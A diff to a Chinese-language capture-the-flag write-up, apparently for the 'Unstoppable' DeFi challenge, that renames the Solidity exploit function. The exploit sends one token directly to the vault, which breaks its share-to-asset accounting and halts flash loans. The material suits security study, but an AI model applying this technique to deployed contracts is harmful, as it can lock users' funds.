@@ -74,9 +74,8 @@ ERC20 代币原生支持 transfer 转账，攻击者可以不经过合约任何�
 ## 五、EXP
 
 ```solidity
-function exploit() internal override {
-    // 直接向金库转账1枚代币，破坏份额与资产的一致性
-    token.transfer(address(vault), 1);
+function test_unstoppable() public checkSolvedByPlayer {
+    token.transfer(address(vault), 1); // 直接向金库转账1枚代币，破坏份额与资产的一致性
 }
 ```
 
